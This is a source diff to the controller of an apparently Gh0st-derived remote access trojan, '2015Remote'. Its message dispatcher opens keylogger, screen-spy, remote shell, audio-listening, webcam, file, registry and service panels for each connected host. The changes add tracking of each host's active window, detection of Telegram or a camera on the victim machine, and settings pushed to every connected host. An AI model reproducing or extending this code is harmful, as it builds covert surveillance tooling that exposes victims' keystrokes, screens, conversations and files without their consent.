@@ -38,7 +38,7 @@ enum
 	ONLINELIST_VIDEO,         //摄像头(有无)
 	ONLINELIST_PING,           //PING(对方的网速)
 	ONLINELIST_VERSION,	       // 版本信息
-	ONLINELIST_LOGINTIME,      // 启动时间
+	ONLINELIST_LOGINTIME,      // 活动窗口
 	ONLINELIST_CLIENTTYPE,		// 客户端类型
 	ONLINELIST_MAX, 
 };
@@ -62,7 +62,7 @@ COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] =
 	{"摄像头",			72	},
 	{"PING",			100	},
 	{"版本",			80	},
-	{"启动时间",		150 },
+	{"活动窗口",		150 },
 	{"类型",			50 },
 };
 
@@ -79,7 +79,7 @@ COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] =
 
 int g_Column_Online_Width  = 0;
 int g_Column_Message_Width = 0;
-IOCPServer *m_iocpServer   = NULL;
+
 CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;
 
 static UINT Indicators[] =
@@ -119,8 +119,10 @@ END_MESSAGE_MAP()
 // CMy2015RemoteDlg 对话框
 
 
-CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
+CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
 {
+	m_iocpServer = iocpServer;
+	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 
 	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
@@ -382,6 +384,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
 	ShowMessage(true,strIP+"主机上线");
 	LeaveCriticalSection(&m_cs);
+
+	SendMasterSettings(ContextObject);
 }
 
 
@@ -451,7 +455,16 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		OnCancel();
 		return FALSE;
 	}
-
+	int m = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ReportInterval");
+	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
+	m_settings = { m>0 ? m : 5, sizeof(void*) == 8, __DATE__, n };
+	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
+	std::string str = myMap[n];
+	LVCOLUMN lvColumn;
+	memset(&lvColumn, 0, sizeof(LVCOLUMN));
+	lvColumn.mask = LVCF_TEXT;
+	lvColumn.pszText = (char*)str.data();
+	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
 	timeBeginPeriod(1);
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
@@ -601,13 +614,19 @@ void CMy2015RemoteDlg::Release(){
 		m_iocpServer->OnClientPreSending(ContextObject, &bToken, sizeof(BYTE));
 	}
 	LeaveCriticalSection(&m_cs);
-	Sleep(200);
+	Sleep(500);
 
-	if (m_iocpServer!=NULL)
+	if (m_iocpServer != NULL)
 	{
-		delete m_iocpServer;
+		m_iocpServer->Destroy();
 		m_iocpServer = NULL;
 	}
+	g_2015RemoteDlg = NULL;
+	SetEvent(m_hExit);
+	CloseHandle(m_hExit);
+	m_hExit = NULL;
+	Sleep(500);
+
 	timeEndPeriod(1);
 }
 
@@ -900,6 +919,21 @@ void CMy2015RemoteDlg::OnMainSet()
 	{
 		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
 	}
+	int m = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ReportInterval");
+	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
+	if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
+		return;
+	}
+
+	LVCOLUMN lvColumn;
+	memset(&lvColumn, 0, sizeof(LVCOLUMN));
+	lvColumn.mask = LVCF_TEXT;
+	lvColumn.pszText = Dlg.m_sSoftwareDetect.GetBuffer();
+	CLock L(m_cs);
+	m_settings.ReportInterval = m;
+	m_settings.DetectSoftware = n;
+	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
+	SendMasterSettings(nullptr);
 }
 
 
@@ -925,7 +959,7 @@ BOOL CMy2015RemoteDlg::ListenPort()
 
 BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 {
-	m_iocpServer = new IOCPServer;                //动态申请我们的类对象
+	assert(m_iocpServer);
 	UINT ret = 0;
 	if ( (ret=m_iocpServer->StartServer(NotifyProc, OfflineProc, nPort)) !=0 )
 	{
@@ -933,8 +967,6 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 		char code[32];
 		sprintf_s(code, "%d", ret);
 		MessageBox("调用函数StartServer失败! 错误代码:"+CString(code));
-		delete m_iocpServer;
-		m_iocpServer = NULL;
 		return FALSE;
 	}
 
@@ -947,7 +979,10 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 
 VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 {
-	AUTO_TICK(20);
+	if (!g_2015RemoteDlg)
+		return;
+
+	AUTO_TICK(50);
 
 	switch (ContextObject->v1)
 	{
@@ -1005,8 +1040,20 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
-	default:
-		g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)ContextObject, (LPARAM)ContextObject);
+	default: {
+		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		if (hEvent == NULL) {
+			Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
+			return;
+		}
+		if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
+			Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
+			CloseHandle(hEvent);
+			return;
+		}
+		HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
+		DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+	}
 	}
 }
 
@@ -1020,6 +1067,8 @@ struct dlgInfo
 
 VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
 {
+	if (!g_2015RemoteDlg)
+		return;
 	dlgInfo* dlg = ContextObject->v1 > 0 ? new dlgInfo(ContextObject->hDlg, ContextObject->v1) : NULL;
 
 	SOCKET nSocket = ContextObject->sClientSocket;
@@ -1031,16 +1080,27 @@ VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
 
 
 LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
+	HANDLE hEvent = (HANDLE)wParam;
 	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
 	MessageHandle(ContextObject);
+	if (hEvent) {
+		SetEvent(hEvent);
+		CloseHandle(hEvent);
+	}
 	return S_OK;
 }
 
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
 {
+	if (isClosed) {
+		return;
+	}
 	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
+	case TOKEN_HEARTBEAT: case 137:
+		UpdateActiveWindow(ContextObject);
+		break;
 	case SOCKET_DLLLOADER: {// 请求DLL
 		BYTE cmd[32] = { COMMAND_BYE };
 		const char reason[] = "请求不支持, 主控命令其退出!";
@@ -1048,7 +1108,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		m_iocpServer->Send(ContextObject, cmd, sizeof(cmd));
 		break;
 	}
-	case COMMAND_BYE:
+	case COMMAND_BYE: // 主机下线
 		{
 			CancelIo((HANDLE)ContextObject->sClientSocket);
 			closesocket(ContextObject->sClientSocket); 
@@ -1056,58 +1116,58 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 			break;
 		}
 	case TOKEN_KEYBOARD_START: {// 键盘记录
-			g_2015RemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
+			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
 	case TOKEN_LOGIN: // 上线包  shine
 		{
-			g_2015RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
+			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
 			break;
 		}
-	case TOKEN_BITMAPINFO:
+	case TOKEN_BITMAPINFO: // 远程桌面
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);   
+			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_DRIVE_LIST:
+	case TOKEN_DRIVE_LIST: // 文件管理
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);   
+			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_TALK_START:
+	case TOKEN_TALK_START: // 发送消息
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);   
+			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SHELL_START:
+	case TOKEN_SHELL_START: // 远程终端
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);   
+			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WSLIST:  //wndlist
-	case TOKEN_PSLIST:  //processlist
+	case TOKEN_WSLIST:  // 窗口管理
+	case TOKEN_PSLIST:  // 进程管理
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
+			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_AUDIO_START:
+	case TOKEN_AUDIO_START: // 语音监听
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);  
+			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_REGEDIT:
+	case TOKEN_REGEDIT: // 注册表管理
 		{                            
-			g_2015RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);  
+			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SERVERLIST:
+	case TOKEN_SERVERLIST: // 服务管理
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
+			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WEBCAM_BITMAPINFO:
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
+			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
 	}
@@ -1123,7 +1183,6 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		return -1;
 	}
 
-	CString	strToolTipsText;
 	try
 	{
 
@@ -1158,7 +1217,7 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		//网速
 		strPing.Format("%d", LoginInfor->dwSpeed);
 
-		strVideo = LoginInfor->bWebCamIsExist ? "有" : "无";
+		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";
 
 		strAddr.Format("%d", nSocket);
 		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, 
@@ -1265,6 +1324,54 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 
 	return S_OK;
 }
+
+void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
+	Heartbeat hb;
+	ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);
+
+	// 回复心跳
+	{
+		HeartbeatACK ack = { hb.Time };
+		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
+		memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
+		m_iocpServer->Send(ctx, buf, sizeof(buf));
+	}
+
+	CLock L(m_cs);
+	int n = m_CList_Online.GetItemCount();
+	DWORD_PTR cur = (DWORD_PTR)ctx;
+	for (int i = 0; i < n; ++i) {
+		DWORD_PTR id = m_CList_Online.GetItemData(i);
+		if (id == cur) {
+			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
+			if (hb.Ping > 0)
+				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
+			if (m_settings.DetectSoftware)
+				m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
+			return;
+		}
+	}
+}
+
+
+void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
+	BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
+	memcpy(buf+1, &m_settings, sizeof(MasterSettings));
+
+	if (ctx) {
+		m_iocpServer->Send(ctx, buf, sizeof(buf));
+	}
+	else {
+		EnterCriticalSection(&m_cs);
+		for (int i=0, n=m_CList_Online.GetItemCount(); i<n; ++i)
+		{
+			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
+			m_iocpServer->Send(ContextObject, buf, sizeof(buf));
+		}
+		LeaveCriticalSection(&m_cs);
+	}
+}
+
 
 LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
